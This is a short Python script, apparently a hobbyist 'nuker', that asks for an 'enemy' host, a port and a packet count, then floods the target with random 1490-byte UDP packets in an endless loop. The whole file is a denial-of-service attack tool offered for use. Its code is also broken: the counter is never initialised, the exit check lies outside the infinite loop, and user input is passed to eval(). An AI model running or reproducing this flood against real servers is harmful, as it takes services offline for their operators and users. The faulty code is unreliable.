import requests
import os
import socket
import random 
print("""
**********************
*     X_X             *
* Made by Mystic-poop *
*         Or          *
*       Xenz          *
*                     *
*                     * 
***********************
 """)
print("Write your enemy (with http:// or https://)")
gonnacooked = input()
print("which port do you want to explode")
whichport =eval(input())
print("How much nukes need to send ")
amountofnukes =eval(input())
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
os.system("clear" if os.name == "posix" else "cls")
while  True:
    sock.sendto(bytes ,(gonnacooked, whichport))
    nukes = nukes +1
    print ("Nuking the server...")
if nukes > amountofnukes:
    print("Done!")
    input("ress Enter to exit")
